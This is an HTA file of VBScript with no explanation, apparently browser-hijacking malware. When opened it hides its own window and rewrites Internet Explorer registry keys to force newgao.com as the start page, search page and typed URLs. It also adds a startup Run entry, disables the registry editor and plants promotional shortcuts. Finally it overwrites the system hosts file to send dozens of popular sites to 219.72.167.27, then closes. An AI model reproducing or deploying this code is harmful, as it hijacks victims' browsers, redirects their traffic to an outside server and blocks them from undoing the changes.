<html>
<hta:application caption="no" showintaskbar="no">
<body onload="window.blur();">
<object id='bugs' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script language=vbscript>
l=screen.width+200
t=screen.height+200
moveTo l,t
resizeTo 0,0
</script>
<script LANGUAGE="VBScript">
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "Http://newgao.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "Http://newgao.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "Http://newgao.com" 
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", "Http://newgao.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url1","Http://newgao.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url2","Http://newgao.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url3","Http://newgao.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","Http://newgao.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Second Home Page","Http://newgao.com"
bugs.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage","1","REG_DWORD"
bugs.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IEXPLORE.EXE", "IEXPLORE.EXE Http://newgao.com"
bugs.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools","1","REG_DWORD"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title", "★流行音乐档案★http://newgao.com"
on error resume next
Call LongFei_AddFavorites("-『!流行音乐在线!』","Http://newgao.com")
Call LongFei_AddFavorites("『!另类电影让你爽个够!』","Http://www.tp123.com")
Call LongFei_AddFavorites("-!流行音乐在线!","Http://newgao.com")
Call LongFei_AddFavorites("!另类电影让你爽个够!","Http://www.tp123.com")
on error resume next
Call LongFei_AddDesktop("『!流行音乐在线!』","Http://newgao.com")
on error resume next
Call LongFei_AddQuickLaunch("『!另类电影让你爽个够!』","Http://www.tp123.com")
Function LongFei_AddFavorites(N, U)
	on error resume next
	Set S = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/" + N +".URL")
	S.TargetPath = U	
	S.Save()
	Set Sl = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/链接/" + N +".URL")
	Sl.TargetPath = U
	Sl.Save()
End Function

Function LongFei_AddDesktop(N, U)
	on error resume next
	Set S = bugs.CreateShortcut(bugs.SpecialFolders("AllUsersDesktop") + "/" + N +".URL")
	S.TargetPath = U	
	S.Save()
End Function
</script>
<script language="VbScript">
<!--
on error resume next
set fso=CreateObject("Scripting.FileSystemObject")
function l()
l1=fso.GetSpecialFolder(0)
l2=fso.GetSpecialFolder(1)
if instr(lcase(l2),"system32")>1 then
l=l1&"\system32\drivers\etc\hosts"
else
l=l1&"\hosts"
end if
end function
p=l()
function w(v1)
w="219.72.167.27  "&v1&chr(13)&chr(10)
end function
v="127.0.0.1	localhost"&chr(13)&chr(10)
v=v+w("search.union.3721.com")
v=v+w("www.cnww.net")
v=v+w("www.265.com")
v=v+w("www.17777.com")
v=v+w("www.hao123.com")
v=v+w("popme.163.com")
v=v+w("images.sohu.com")
v=v+w("ad4.sina.com.cn")
v=v+w("ad.tom.com")
v=v+w("search.union.3721.com")
v=v+w("post.baidu.com")
v=v+w("site.google.com")
v=v+w("flash.baidu.com")
v=v+w("assistant.3721.com")
v=v+w("pfp.sina.com.cn")
v=v+w("cn.websearch.yahoo.com")
v=v+w("sms.qq.com")
v=v+w("www.qq.com")
v=v+w("home.qq.com")
v=v+w("partner.lead2.com.cn")
v=v+w("ad.cn.doubleclick.net")
v=v+w("auto.search.msn.com")
v=v+w("www.ourgame.com")
v=v+w("www.the9.com")
v=v+w("www.flashempire.com")
v=v+w("www.qq163.com")
v=v+w("qq163.com")
v=v+w("www.9sky.com")
v=v+w("www.tom-1.com")
v=v+w("www.17173.com")
v=v+w("www.yaotou.com")
v=v+w("union.3721.com")
v=v+w("music.feifa.com")
v=v+w("www.vodfans.com")
v=v+w("www.sogua.com")
v=v+w("fm974.tom.com")
v=v+w("ent.tom.com")
v=v+w("music.tyfo.com")
v=v+w("www.wanwa.com")
v=v+w("www.guang.org")
v=v+w("www.wz.zj.cn")
v=v+w("www.3189.net")
v=v+w("music.17o8.com")
v=v+w("www.99music.net")
v=v+w("www.9mei.com")
v=v+w("www.cococ.com")
v=v+w("www.qqqq.cn")
v=v+w("www.ttjj.com")
v=v+w("www.bnb.com.cn")
v=v+w("www.z163.com")
v=v+w("game.163.com")
v=v+w("games.sina.com.cn")
v=v+w("www.v111.com")
v=v+w("music.v111.com")
v=v+w("www.3tom.com")
v=v+w("www.xkqq.com")
v=v+w("www.verymp3.com")
v=v+w("www.91look.com")
v=v+w("www.168101.com")
v=v+w("www.cmfu.com")
v=v+w("www.666e.com")
v=v+w("www.woogood.com")
v=v+w("www.haodx.com")
v=v+w("www.yingku.com")
v=v+w("www.flash51.com")
v=v+w("www.17haha.com")
v=v+w("www.432.cn")
v=v+w("www.sotop.com")
v=v+w("www.cnxp.com")
v=v+w("www.hjsm.net")
v=v+w("music.8wa.com")
v=v+w("www.66vv.com")
v=v+w("www.musicfbi.com")
v=v+w("www.vv66.com")
v=v+w("www.139mm.com")
v=v+w("www.130wg.com")
v=v+w("www.flashsea.com")
v=v+w("film.yun8.com")
v=v+w("movie.59178.com")
v=v+w("www.wo123.com")
v=v+w("www.1ya.cn")
v=v+w("www.happy8.cn")
v=v+w("www.s6.cn")
v=v+w("www.qqee.com")
v=v+w("imgu.21cn.com")
v=v+w("ad8.21cn.com")
v=v+w("www.sohu123.com")
v=v+w("www.chinamp3.com")
v=v+w("www.18z.net")
Set f = fso.CreateTextFile(p, True)
f.Write(v)
f.close
//-->
</script>
<script language="JScript.Encode">
function closeit() {
setTimeout("self.close()",5)
}
closeit()
</script>
</html>